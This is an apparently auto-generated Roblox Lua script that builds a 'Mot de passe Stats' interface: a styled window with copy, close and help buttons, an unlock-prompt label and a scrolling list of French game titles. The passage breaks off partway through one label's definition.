-- Gui to Lua V5
-- GUI : Mot de passe Stats

local Players   = game:GetService('Players')
local player    = Players.LocalPlayer
local PlayerGui = player:WaitForChild('PlayerGui')

local _old = PlayerGui:FindFirstChild([[Mot de passe Stats]])
if _old then _old:Destroy() end

-- _i : tableau indexe en continu, jamais de trous
-- => evite les nil et la limite 200 variables locales
local _i = {}

-- Instances:

_i[1] = Instance.new("ScreenGui")
_i[1].DisplayOrder = 0
_i[1].Enabled = true
_i[1].IgnoreGuiInset = false
_i[1].ResetOnSpawn = true
_i[1].Name = [[Mot de passe Stats]]
_i[1].Parent = PlayerGui

_i[2] = Instance.new("Frame")
_i[2].AnchorPoint = Vector2.new(0.5,0.5)
_i[2].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[2].BackgroundTransparency = 1
_i[2].BorderColor3 = Color3.fromRGB(0,0,0)
_i[2].BorderSizePixel = 0
_i[2].ClipsDescendants = false
_i[2].LayoutOrder = 0
_i[2].Position = UDim2.new(0.5,0,0.5,0)
_i[2].Rotation = 0
_i[2].Selectable = false
_i[2].Size = UDim2.new(1,0,1,0)
_i[2].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[2].Visible = false
_i[2].ZIndex = 1
_i[2].Name = [[Canvas]]
_i[2].Parent = _i[1]

_i[3] = Instance.new("Frame")
_i[3].AnchorPoint = Vector2.new(0.5,0.5)
_i[3].BackgroundColor3 = Color3.fromRGB(255,0,4)
_i[3].BackgroundTransparency = 1
_i[3].BorderColor3 = Color3.fromRGB(0,0,0)
_i[3].BorderSizePixel = 0
_i[3].ClipsDescendants = false
_i[3].LayoutOrder = 0
_i[3].Position = UDim2.new(0.5,0,0.5,0)
_i[3].Rotation = 0
_i[3].Selectable = false
_i[3].Size = UDim2.new(0.601042,0,0.643188,0)
_i[3].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[3].Visible = true
_i[3].ZIndex = 1
_i[3].Name = [[Container]]
_i[3].Parent = _i[2]

_i[4] = Instance.new("UIAspectRatioConstraint")
_i[4].AspectRatio = 1.6628241539001465
_i[4].AspectType = Enum.AspectType.FitWithinMaxSize
_i[4].DominantAxis = Enum.DominantAxis.Width
_i[4].Name = [[UIAspectRatioConstraint]]
_i[4].Parent = _i[3]

_i[5] = Instance.new("Frame")
_i[5].AnchorPoint = Vector2.new(0.5,0.5)
_i[5].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[5].BackgroundTransparency = 1
_i[5].BorderColor3 = Color3.fromRGB(0,0,0)
_i[5].BorderSizePixel = 0
_i[5].ClipsDescendants = false
_i[5].LayoutOrder = 0
_i[5].Position = UDim2.new(0.5,0,0.521614,0)
_i[5].Rotation = 0
_i[5].Selectable = false
_i[5].Size = UDim2.new(0.959272,0,0.936599,0)
_i[5].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[5].Visible = true
_i[5].ZIndex = 1
_i[5].Name = [[Main]]
_i[5].Parent = _i[3]

_i[6] = Instance.new("UIAspectRatioConstraint")
_i[6].AspectRatio = 1.703076958656311
_i[6].AspectType = Enum.AspectType.FitWithinMaxSize
_i[6].DominantAxis = Enum.DominantAxis.Width
_i[6].Name = [[UIAspectRatioConstraint]]
_i[6].Parent = _i[5]

_i[7] = Instance.new("ImageLabel")
_i[7].AnchorPoint = Vector2.new(0.5,0.5)
_i[7].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[7].BackgroundTransparency = 1
_i[7].BorderColor3 = Color3.fromRGB(0,0,0)
_i[7].BorderSizePixel = 0
_i[7].ClipsDescendants = false
_i[7].LayoutOrder = 0
_i[7].Position = UDim2.new(0.5,0,0.5,0)
_i[7].Rotation = 0
_i[7].Selectable = false
_i[7].Size = UDim2.new(0.999097,0,0.993846,0)
_i[7].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[7].Visible = true
_i[7].ZIndex = 1
_i[7].Image = [[rbxassetid://16303547683]]
_i[7].ImageColor3 = Color3.fromRGB(140,140,140)
_i[7].ImageRectOffset = Vector2.new(0,0)
_i[7].ImageRectSize = Vector2.new(0,0)
_i[7].ImageTransparency = 0
_i[7].ResampleMode = Enum.ResamplerMode.Default
_i[7].ScaleType = Enum.ScaleType.Stretch
_i[7].SliceCenter = Rect.new(0,0,0,0)
_i[7].SliceScale = 1
_i[7].Name = [[Background]]
_i[7].Parent = _i[5]

_i[8] = Instance.new("UIGradient")
_i[8].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(46,46,46)),ColorSequenceKeypoint.new(1,Color3.fromRGB(29,29,29))})
_i[8].Offset = Vector2.new(0,0)
_i[8].Rotation = -90
_i[8].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[8].Name = [[UIGradient]]
_i[8].Parent = _i[7]

_i[9] = Instance.new("UIAspectRatioConstraint")
_i[9].AspectRatio = 1.7120742797851562
_i[9].AspectType = Enum.AspectType.FitWithinMaxSize
_i[9].DominantAxis = Enum.DominantAxis.Width
_i[9].Name = [[UIAspectRatioConstraint]]
_i[9].Parent = _i[7]

_i[10] = Instance.new("ImageLabel")
_i[10].AnchorPoint = Vector2.new(0.5,0.5)
_i[10].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[10].BackgroundTransparency = 1
_i[10].BorderColor3 = Color3.fromRGB(0,0,0)
_i[10].BorderSizePixel = 0
_i[10].ClipsDescendants = false
_i[10].LayoutOrder = 0
_i[10].Position = UDim2.new(0.48915,0,0.712074,0)
_i[10].Rotation = 0
_i[10].Selectable = false
_i[10].Size = UDim2.new(0.979204,0,0.574303,0)
_i[10].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[10].Visible = true
_i[10].ZIndex = 1
_i[10].Image = [[rbxassetid://16303570034]]
_i[10].ImageColor3 = Color3.fromRGB(11,11,11)
_i[10].ImageRectOffset = Vector2.new(0,0)
_i[10].ImageRectSize = Vector2.new(0,0)
_i[10].ImageTransparency = 0
_i[10].ResampleMode = Enum.ResamplerMode.Default
_i[10].ScaleType = Enum.ScaleType.Stretch
_i[10].SliceCenter = Rect.new(0,0,0,0)
_i[10].SliceScale = 1
_i[10].Name = [[Texture]]
_i[10].Parent = _i[7]

_i[11] = Instance.new("UIAspectRatioConstraint")
_i[11].AspectRatio = 2.919137477874756
_i[11].AspectType = Enum.AspectType.FitWithinMaxSize
_i[11].DominantAxis = Enum.DominantAxis.Width
_i[11].Name = [[UIAspectRatioConstraint]]
_i[11].Parent = _i[10]

_i[12] = Instance.new("ImageLabel")
_i[12].AnchorPoint = Vector2.new(0.5,0.5)
_i[12].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[12].BackgroundTransparency = 1
_i[12].BorderColor3 = Color3.fromRGB(0,0,0)
_i[12].BorderSizePixel = 0
_i[12].ClipsDescendants = false
_i[12].LayoutOrder = 0
_i[12].Position = UDim2.new(0.485533,0,0.99226,0)
_i[12].Rotation = 0
_i[12].Selectable = false
_i[12].Size = UDim2.new(0.971067,0,0.0325077,0)
_i[12].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[12].Visible = true
_i[12].ZIndex = 1
_i[12].Image = [[rbxassetid://16303582510]]
_i[12].ImageColor3 = Color3.fromRGB(5,113,255)
_i[12].ImageRectOffset = Vector2.new(0,0)
_i[12].ImageRectSize = Vector2.new(0,0)
_i[12].ImageTransparency = 0
_i[12].ResampleMode = Enum.ResamplerMode.Default
_i[12].ScaleType = Enum.ScaleType.Stretch
_i[12].SliceCenter = Rect.new(0,0,0,0)
_i[12].SliceScale = 1
_i[12].Name = [[Accent]]
_i[12].Parent = _i[7]

_i[13] = Instance.new("UIAspectRatioConstraint")
_i[13].AspectRatio = 51.14285659790039
_i[13].AspectType = Enum.AspectType.FitWithinMaxSize
_i[13].DominantAxis = Enum.DominantAxis.Width
_i[13].Name = [[UIAspectRatioConstraint]]
_i[13].Parent = _i[12]

_i[14] = Instance.new("UIGradient")
_i[14].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(0,0,0)),ColorSequenceKeypoint.new(0.510815,Color3.fromRGB(0,229,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(0,0,0))})
_i[14].Offset = Vector2.new(0,0)
_i[14].Rotation = 0
_i[14].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[14].Name = [[UIGradient]]
_i[14].Parent = _i[12]

_i[15] = Instance.new("TextButton")
_i[15].AnchorPoint = Vector2.new(0.5,0.5)
_i[15].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[15].BackgroundTransparency = 1
_i[15].BorderColor3 = Color3.fromRGB(0,0,0)
_i[15].BorderSizePixel = 0
_i[15].ClipsDescendants = false
_i[15].LayoutOrder = 0
_i[15].Position = UDim2.new(0.986159,0,0.0172212,0)
_i[15].Rotation = 0
_i[15].Selectable = true
_i[15].Size = UDim2.new(0.0747572,0,0.133846,0)
_i[15].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[15].Visible = true
_i[15].ZIndex = 1
_i[15].AutoButtonColor = true
_i[15].Font = Enum.Font.SourceSans
_i[15].LineHeight = 1
_i[15].Modal = false
_i[15].RichText = false
_i[15].Selected = false
_i[15].Text = [[]]
_i[15].TextColor3 = Color3.fromRGB(0,0,0)
_i[15].TextScaled = false
_i[15].TextSize = 14
_i[15].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[15].TextStrokeTransparency = 1
_i[15].TextTransparency = 0
_i[15].TextWrapped = false
_i[15].TextXAlignment = Enum.TextXAlignment.Center
_i[15].TextYAlignment = Enum.TextYAlignment.Center
_i[15].Name = [[X]]
_i[15].Parent = _i[5]

_i[16] = Instance.new("ImageLabel")
_i[16].AnchorPoint = Vector2.new(0,0)
_i[16].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[16].BackgroundTransparency = 1
_i[16].BorderColor3 = Color3.fromRGB(0,0,0)
_i[16].BorderSizePixel = 0
_i[16].ClipsDescendants = false
_i[16].LayoutOrder = 0
_i[16].Position = UDim2.new(-0.139535,0,-0.149177,0)
_i[16].Rotation = 0
_i[16].Selectable = false
_i[16].Size = UDim2.new(1.25581,0,1.2548,0)
_i[16].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[16].Visible = true
_i[16].ZIndex = 1
_i[16].Image = [[rbxassetid://126371125566945]]
_i[16].ImageColor3 = Color3.fromRGB(255,255,255)
_i[16].ImageRectOffset = Vector2.new(0,0)
_i[16].ImageRectSize = Vector2.new(0,0)
_i[16].ImageTransparency = 0
_i[16].ResampleMode = Enum.ResamplerMode.Default
_i[16].ScaleType = Enum.ScaleType.Stretch
_i[16].SliceCenter = Rect.new(0,0,0,0)
_i[16].SliceScale = 1
_i[16].Name = [[ImageLabel]]
_i[16].Parent = _i[15]

_i[17] = Instance.new("UIGradient")
_i[17].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(227,227,227)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,255,255))})
_i[17].Offset = Vector2.new(0,0)
_i[17].Rotation = 0
_i[17].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[17].Name = [[UIGradient]]
_i[17].Parent = _i[16]

_i[18] = Instance.new("TextButton")
_i[18].AnchorPoint = Vector2.new(0.5,0.5)
_i[18].BackgroundColor3 = Color3.fromRGB(42,138,255)
_i[18].BackgroundTransparency = 1
_i[18].BorderColor3 = Color3.fromRGB(0,0,0)
_i[18].BorderSizePixel = 0
_i[18].ClipsDescendants = false
_i[18].LayoutOrder = 0
_i[18].Position = UDim2.new(0.500237,0,0.82079,0)
_i[18].Rotation = 0
_i[18].Selectable = true
_i[18].Size = UDim2.new(0.443771,0,0.195039,0)
_i[18].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[18].Visible = true
_i[18].ZIndex = 1
_i[18].AutoButtonColor = true
_i[18].Font = Enum.Font.SourceSans
_i[18].LineHeight = 1
_i[18].Modal = false
_i[18].RichText = false
_i[18].Selected = false
_i[18].Text = [[]]
_i[18].TextColor3 = Color3.fromRGB(0,0,0)
_i[18].TextScaled = false
_i[18].TextSize = 14
_i[18].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[18].TextStrokeTransparency = 1
_i[18].TextTransparency = 0
_i[18].TextWrapped = false
_i[18].TextXAlignment = Enum.TextXAlignment.Center
_i[18].TextYAlignment = Enum.TextYAlignment.Center
_i[18].Name = [[Bouton Copier]]
_i[18].Parent = _i[5]

_i[19] = Instance.new("TextLabel")
_i[19].AnchorPoint = Vector2.new(0,0)
_i[19].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[19].BackgroundTransparency = 1
_i[19].BorderColor3 = Color3.fromRGB(255,255,255)
_i[19].BorderSizePixel = 0
_i[19].ClipsDescendants = false
_i[19].LayoutOrder = 0
_i[19].Position = UDim2.new(0.215054,0,0.0138885,0)
_i[19].Rotation = 0
_i[19].Selectable = false
_i[19].Size = UDim2.new(0.580645,0,0.984567,0)
_i[19].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[19].Visible = true
_i[19].ZIndex = 2
_i[19].Font = Enum.Font.SourceSans
_i[19].LineHeight = 1
_i[19].MaxVisibleGraphemes = -1
_i[19].RichText = false
_i[19].Text = [[COPYC]]
_i[19].TextColor3 = Color3.fromRGB(255,255,255)
_i[19].TextScaled = true
_i[19].TextSize = 100
_i[19].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[19].TextStrokeTransparency = 1
_i[19].TextTransparency = 0
_i[19].TextTruncate = Enum.TextTruncate.None
_i[19].TextWrapped = true
_i[19].TextXAlignment = Enum.TextXAlignment.Center
_i[19].TextYAlignment = Enum.TextYAlignment.Center
_i[19].Name = [[TextLabel]]
_i[19].Parent = _i[18]

_i[20] = Instance.new("UIStroke")
_i[20].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[20].Color = Color3.fromRGB(255,255,255)
_i[20].LineJoinMode = Enum.LineJoinMode.Round
_i[20].Thickness = 3.9000000953674316
_i[20].Transparency = 0
_i[20].Name = [[UIStroke]]
_i[20].Parent = _i[19]

_i[21] = Instance.new("UIGradient")
_i[21].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(255,217,0)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,0,4))})
_i[21].Offset = Vector2.new(0,0)
_i[21].Rotation = 0
_i[21].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[21].Name = [[UIGradient]]
_i[21].Parent = _i[20]

_i[22] = Instance.new("UIGradient")
_i[22].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(0,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,255,255))})
_i[22].Offset = Vector2.new(0,0)
_i[22].Rotation = -90
_i[22].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[22].Name = [[UIGradient]]
_i[22].Parent = _i[19]

_i[23] = Instance.new("UIAspectRatioConstraint")
_i[23].AspectRatio = 3.875
_i[23].AspectType = Enum.AspectType.FitWithinMaxSize
_i[23].DominantAxis = Enum.DominantAxis.Width
_i[23].Name = [[UIAspectRatioConstraint]]
_i[23].Parent = _i[18]

_i[24] = Instance.new("ImageLabel")
_i[24].AnchorPoint = Vector2.new(0,0)
_i[24].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[24].BackgroundTransparency = 1
_i[24].BorderColor3 = Color3.fromRGB(0,0,0)
_i[24].BorderSizePixel = 0
_i[24].ClipsDescendants = false
_i[24].LayoutOrder = 0
_i[24].Position = UDim2.new(0,0,-0.875001,0)
_i[24].Rotation = 0
_i[24].Selectable = false
_i[24].Size = UDim2.new(1,0,2.53571,0)
_i[24].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[24].Visible = true
_i[24].ZIndex = 1
_i[24].Image = [[rbxassetid://79293578354348]]
_i[24].ImageColor3 = Color3.fromRGB(255,255,255)
_i[24].ImageRectOffset = Vector2.new(0,0)
_i[24].ImageRectSize = Vector2.new(0,0)
_i[24].ImageTransparency = 0
_i[24].ResampleMode = Enum.ResamplerMode.Default
_i[24].ScaleType = Enum.ScaleType.Stretch
_i[24].SliceCenter = Rect.new(0,0,0,0)
_i[24].SliceScale = 1
_i[24].Name = [[ImageLabel]]
_i[24].Parent = _i[18]

_i[25] = Instance.new("UIGradient")
_i[25].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(0,0,0)),ColorSequenceKeypoint.new(0.530782,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,255,255))})
_i[25].Offset = Vector2.new(0,0)
_i[25].Rotation = -90
_i[25].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[25].Name = [[UIGradient]]
_i[25].Parent = _i[24]

_i[26] = Instance.new("ImageLabel")
_i[26].AnchorPoint = Vector2.new(0,0)
_i[26].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[26].BackgroundTransparency = 1
_i[26].BorderColor3 = Color3.fromRGB(0,0,0)
_i[26].BorderSizePixel = 0
_i[26].ClipsDescendants = false
_i[26].LayoutOrder = 0
_i[26].Position = UDim2.new(0.419913,0,0.235672,-7)
_i[26].Rotation = 0
_i[26].Selectable = false
_i[26].Size = UDim2.new(0.159058,0,0.270888,0)
_i[26].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[26].Visible = true
_i[26].ZIndex = 1
_i[26].Image = [[rbxassetid://123965417468651]]
_i[26].ImageColor3 = Color3.fromRGB(255,255,255)
_i[26].ImageRectOffset = Vector2.new(0,0)
_i[26].ImageRectSize = Vector2.new(0,0)
_i[26].ImageTransparency = 0
_i[26].ResampleMode = Enum.ResamplerMode.Default
_i[26].ScaleType = Enum.ScaleType.Stretch
_i[26].SliceCenter = Rect.new(0,0,0,0)
_i[26].SliceScale = 1
_i[26].Name = [[ImageLabel]]
_i[26].Parent = _i[5]

_i[27] = Instance.new("UIStroke")
_i[27].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[27].Color = Color3.fromRGB(0,0,0)
_i[27].LineJoinMode = Enum.LineJoinMode.Round
_i[27].Thickness = 5.599999904632568
_i[27].Transparency = 0.6000000238418579
_i[27].Name = [[UIStroke]]
_i[27].Parent = _i[26]

_i[28] = Instance.new("UICorner")
_i[28].CornerRadius = UDim.new(0,10000)
_i[28].Name = [[UICorner]]
_i[28].Parent = _i[26]

_i[29] = Instance.new("TextButton")
_i[29].AnchorPoint = Vector2.new(0.5,0.5)
_i[29].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[29].BackgroundTransparency = 1
_i[29].BorderColor3 = Color3.fromRGB(0,0,0)
_i[29].BorderSizePixel = 0
_i[29].ClipsDescendants = false
_i[29].LayoutOrder = 0
_i[29].Position = UDim2.new(0.235406,0,0.184572,0)
_i[29].Rotation = 0
_i[29].Selectable = true
_i[29].Size = UDim2.new(0.0445362,0,0.0704308,0)
_i[29].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[29].Visible = true
_i[29].ZIndex = 1
_i[29].AutoButtonColor = true
_i[29].Font = Enum.Font.SourceSans
_i[29].LineHeight = 1
_i[29].Modal = false
_i[29].RichText = false
_i[29].Selected = false
_i[29].Text = [[]]
_i[29].TextColor3 = Color3.fromRGB(0,0,0)
_i[29].TextScaled = false
_i[29].TextSize = 14
_i[29].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[29].TextStrokeTransparency = 1
_i[29].TextTransparency = 0
_i[29].TextWrapped = false
_i[29].TextXAlignment = Enum.TextXAlignment.Center
_i[29].TextYAlignment = Enum.TextYAlignment.Center
_i[29].Name = [[?]]
_i[29].Parent = _i[5]

_i[30] = Instance.new("ImageLabel")
_i[30].AnchorPoint = Vector2.new(0,0)
_i[30].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[30].BackgroundTransparency = 1
_i[30].BorderColor3 = Color3.fromRGB(0,0,0)
_i[30].BorderSizePixel = 0
_i[30].ClipsDescendants = false
_i[30].LayoutOrder = 0
_i[30].Position = UDim2.new(0,0,-0.0666667,0)
_i[30].Rotation = 0
_i[30].Selectable = false
_i[30].Size = UDim2.new(1,0,1.1,0)
_i[30].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[30].Visible = true
_i[30].ZIndex = 1
_i[30].Image = [[rbxassetid://131562149782285]]
_i[30].ImageColor3 = Color3.fromRGB(255,255,255)
_i[30].ImageRectOffset = Vector2.new(0,0)
_i[30].ImageRectSize = Vector2.new(0,0)
_i[30].ImageTransparency = 0
_i[30].ResampleMode = Enum.ResamplerMode.Default
_i[30].ScaleType = Enum.ScaleType.Crop
_i[30].SliceCenter = Rect.new(0,0,0,0)
_i[30].SliceScale = 1
_i[30].Name = [[ImageLabel]]
_i[30].Parent = _i[29]

_i[31] = Instance.new("UICorner")
_i[31].CornerRadius = UDim.new(0,20)
_i[31].Name = [[UICorner]]
_i[31].Parent = _i[30]

_i[32] = Instance.new("UIStroke")
_i[32].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[32].Color = Color3.fromRGB(255,255,255)
_i[32].LineJoinMode = Enum.LineJoinMode.Round
_i[32].Thickness = 1.7000000476837158
_i[32].Transparency = 0
_i[32].Name = [[UIStroke]]
_i[32].Parent = _i[30]

_i[33] = Instance.new("TextLabel")
_i[33].AnchorPoint = Vector2.new(0,0)
_i[33].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[33].BackgroundTransparency = 1
_i[33].BorderColor3 = Color3.fromRGB(0,0,0)
_i[33].BorderSizePixel = 0
_i[33].ClipsDescendants = false
_i[33].LayoutOrder = 0
_i[33].Position = UDim2.new(0.232224,0,0.501143,0)
_i[33].Rotation = 0
_i[33].Selectable = false
_i[33].Size = UDim2.new(0.574199,0,0.19233,0)
_i[33].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[33].Visible = true
_i[33].ZIndex = 1
_i[33].Font = Enum.Font.SourceSans
_i[33].LineHeight = 1
_i[33].MaxVisibleGraphemes = -1
_i[33].RichText = false
_i[33].Text = [[Press this button to proceed to the site and complete the unlocking process to access the script.]]
_i[33].TextColor3 = Color3.fromRGB(255,255,255)
_i[33].TextScaled = true
_i[33].TextSize = 14
_i[33].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[33].TextStrokeTransparency = 1
_i[33].TextTransparency = 0
_i[33].TextTruncate = Enum.TextTruncate.None
_i[33].TextWrapped = true
_i[33].TextXAlignment = Enum.TextXAlignment.Left
_i[33].TextYAlignment = Enum.TextYAlignment.Top
_i[33].Name = [[TextLabel]]
_i[33].Parent = _i[5]

_i[34] = Instance.new("UIStroke")
_i[34].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[34].Color = Color3.fromRGB(0,0,0)
_i[34].LineJoinMode = Enum.LineJoinMode.Round
_i[34].Thickness = 3.9000000953674316
_i[34].Transparency = 0
_i[34].Name = [[UIStroke]]
_i[34].Parent = _i[33]

_i[35] = Instance.new("Frame")
_i[35].AnchorPoint = Vector2.new(0,0)
_i[35].BackgroundColor3 = Color3.fromRGB(0,0,0)
_i[35].BackgroundTransparency = 0
_i[35].BorderColor3 = Color3.fromRGB(0,0,0)
_i[35].BorderSizePixel = 0
_i[35].ClipsDescendants = false
_i[35].LayoutOrder = 0
_i[35].Position = UDim2.new(0.0397645,0,0.398296,0)
_i[35].Rotation = 0
_i[35].Selectable = false
_i[35].Size = UDim2.new(0.182917,0,0.0730489,0)
_i[35].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[35].Visible = true
_i[35].ZIndex = 1
_i[35].Name = [[Frame]]
_i[35].Parent = _i[5]

_i[36] = Instance.new("TextLabel")
_i[36].AnchorPoint = Vector2.new(0,0)
_i[36].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[36].BackgroundTransparency = 1
_i[36].BorderColor3 = Color3.fromRGB(0,0,0)
_i[36].BorderSizePixel = 0
_i[36].ClipsDescendants = false
_i[36].LayoutOrder = 0
_i[36].Position = UDim2.new(0,0,0,0)
_i[36].Rotation = 0
_i[36].Selectable = false
_i[36].Size = UDim2.new(1,0,0.943035,0)
_i[36].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[36].Visible = true
_i[36].ZIndex = 1
_i[36].Font = Enum.Font.SourceSans
_i[36].LineHeight = 1
_i[36].MaxVisibleGraphemes = -1
_i[36].RichText = false
_i[36].Text = [[]]
_i[36].TextColor3 = Color3.fromRGB(255,255,255)
_i[36].TextScaled = true
_i[36].TextSize = 14
_i[36].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[36].TextStrokeTransparency = 1
_i[36].TextTransparency = 0
_i[36].TextTruncate = Enum.TextTruncate.None
_i[36].TextWrapped = true
_i[36].TextXAlignment = Enum.TextXAlignment.Center
_i[36].TextYAlignment = Enum.TextYAlignment.Center
_i[36].Name = [[TextLabel]]
_i[36].Parent = _i[35]

_i[37] = Instance.new("Frame")
_i[37].AnchorPoint = Vector2.new(0,0)
_i[37].BackgroundColor3 = Color3.fromRGB(39,39,39)
_i[37].BackgroundTransparency = 0.44999998807907104
_i[37].BorderColor3 = Color3.fromRGB(0,0,0)
_i[37].BorderSizePixel = 0
_i[37].ClipsDescendants = false
_i[37].LayoutOrder = 0
_i[37].Position = UDim2.new(0,0,1,0)
_i[37].Rotation = 0
_i[37].Selectable = false
_i[37].Size = UDim2.new(1,0,5.30288,0)
_i[37].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[37].Visible = true
_i[37].ZIndex = 1
_i[37].Name = [[Frame]]
_i[37].Parent = _i[35]

_i[38] = Instance.new("ScrollingFrame")
_i[38].AnchorPoint = Vector2.new(0,0)
_i[38].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[38].BackgroundTransparency = 1
_i[38].BorderColor3 = Color3.fromRGB(0,0,0)
_i[38].BorderSizePixel = 0
_i[38].ClipsDescendants = true
_i[38].LayoutOrder = 0
_i[38].Position = UDim2.new(0,0,0,0)
_i[38].Rotation = 0
_i[38].Selectable = true
_i[38].Size = UDim2.new(1,0,1,0)
_i[38].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[38].Visible = true
_i[38].ZIndex = 1
_i[38].CanvasPosition = Vector2.new(0,0)
_i[38].CanvasSize = UDim2.new(0,0,2,0)
_i[38].ScrollBarThickness = 12
_i[38].ScrollingDirection = Enum.ScrollingDirection.XY
_i[38].ScrollBarImageColor3 = Color3.fromRGB(255,255,255)
_i[38].Name = [[ScrollingFrame]]
_i[38].Parent = _i[37]

_i[39] = Instance.new("TextLabel")
_i[39].AnchorPoint = Vector2.new(0,0)
_i[39].BackgroundColor3 = Color3.fromRGB(0,0,0)
_i[39].BackgroundTransparency = 0.800000011920929
_i[39].BorderColor3 = Color3.fromRGB(0,0,0)
_i[39].BorderSizePixel = 0
_i[39].ClipsDescendants = false
_i[39].LayoutOrder = 0
_i[39].Position = UDim2.new(0,0,-1.06705e-07,0)
_i[39].Rotation = 0
_i[39].Selectable = false
_i[39].Size = UDim2.new(0,109,0,62)
_i[39].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[39].Visible = true
_i[39].ZIndex = 1
_i[39].Font = Enum.Font.SourceSans
_i[39].LineHeight = 1
_i[39].MaxVisibleGraphemes = -1
_i[39].RichText = true
_i[39].Text = [[[🌍 World 2 🌍] Levage de poids dans la grande ville]]
_i[39].TextColor3 = Color3.fromRGB(85,170,255)
_i[39].TextScaled = true
_i[39].TextSize = 14
_i[39].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[39].TextStrokeTransparency = 1
_i[39].TextTransparency = 0
_i[39].TextTruncate = Enum.TextTruncate.None
_i[39].TextWrapped = true
_i[39].TextXAlignment = Enum.TextXAlignment.Center
_i[39].TextYAlignment = Enum.TextYAlignment.Center
_i[39].Name = [[TextLabel]]
_i[39].Parent = _i[38]

_i[40] = Instance.new("UIListLayout")
_i[40].FillDirection = Enum.FillDirection.Vertical
_i[40].HorizontalAlignment = Enum.HorizontalAlignment.Left
_i[40].Padding = UDim.new(0,0)
_i[40].SortOrder = Enum.SortOrder.Name
_i[40].VerticalAlignment = Enum.VerticalAlignment.Top
_i[40].Name = [[UIListLayout]]
_i[40].Parent = _i[38]

_i[41] = Instance.new("TextLabel")
_i[41].AnchorPoint = Vector2.new(0,0)
_i[41].BackgroundColor3 = Color3.fromRGB(0,0,0)
_i[41].BackgroundTransparency = 0.800000011920929
_i[41].BorderColor3 = Color3.fromRGB(0,0,0)
_i[41].BorderSizePixel = 0
_i[41].ClipsDescendants = false
_i[41].LayoutOrder = 0
_i[41].Position = UDim2.new(0,0,0.216783,0)
_i[41].Rotation = 0
_i[41].Selectable = false
_i[41].Size = UDim2.new(0,100,0,81)
_i[41].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[41].Visible = true
_i[41].ZIndex = 1
_i[41].Font = Enum.Font.SourceSans
_i[41].LineHeight = 1
_i[41].MaxVisibleGraphemes = -1
_i[41].RichText = true
_i[41].Text = [[échappe-toi-au-tsunami-pour-des-brainrots]]
_i[41].TextColor3 = Color3.fromRGB(85,170,255)
_i[41].TextScaled = true
_i[41].TextSize = 14
_i[41].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[41].TextStrokeTransparency = 1
_i[41].TextTransparency = 0
_i[41].TextTruncate = Enum.TextTruncate.None
_i[41].TextWrapped = true
_i[41].TextXAlignment = Enum.TextXAlignment.Center
